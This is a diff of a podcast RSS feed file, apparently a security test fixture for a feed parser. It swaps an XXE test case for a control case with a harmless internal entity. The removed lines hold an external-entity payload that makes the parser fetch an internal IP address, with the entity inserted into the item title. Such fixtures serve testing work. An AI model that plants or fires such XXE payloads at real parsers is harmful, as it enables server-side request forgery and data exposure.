@@ -1,21 +1,21 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rss [ <!ENTITY xxe SYSTEM "http://10.169.4.131/bsrc_uid?userId=1330749291"> ]>
+<!DOCTYPE rss [ <!ENTITY inent "INTERNAL_MARKER_777"> ]>
 <rss xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:podcast="https://podcastindex.org/namespace/1.0" version="2.0">
   <channel>
-    <title>XXETestPod</title>
+    <title>CTLPod</title>
     <link>https://example.com</link>
-    <description>xxe test</description>
+    <description>ctl</description>
     <language>en</language>
     <lastBuildDate>Sat, 12 Sep 2026 09:00:00 GMT</lastBuildDate>
-    <itunes:author>tester</itunes:author>
+    <itunes:author>t</itunes:author>
     <itunes:explicit>false</itunes:explicit>
-    <itunes:image href="https://example.com/art.jpg"/>
+    <itunes:image href="https://example.com/a.jpg"/>
     <itunes:category text="Technology"/>
     <item>
-      <title>XXE_START&xxe;XXE_END</title>
+      <title>IN_START&inent;IN_END</title>
       <description>desc</description>
       <pubDate>Fri, 11 Sep 2026 08:00:00 GMT</pubDate>
-      <guid>xxe-guid-1</guid>
+      <guid>ctl-guid-1</guid>
       <itunes:duration>300</itunes:duration>
       <enclosure url="https://tracking.swap.fm/track/XvDEoI11TR00olTUO8US/prfx.byspotify.com/e/play.podtrac.com/npr-510289/npr.simplecastaudio.com/43b5acee-463e-4612-95ad-d2596d9dd337/episodes/295e4ef9-a287-4ab7-ad1c-8198129dccd2/audio/128/default.mp3?awCollectionId=43b5acee-463e-4612-95ad-d2596d9dd337&amp;awEpisodeId=295e4ef9-a287-4ab7-ad1c-8198129dccd2&amp;feed=hvWWWzRv&amp;t=podcast&amp;e=nx-s1-5966574&amp;p=510289&amp;d=1749&amp;size=27996248" type="audio/mpeg" length="27996248"/>
     </item>
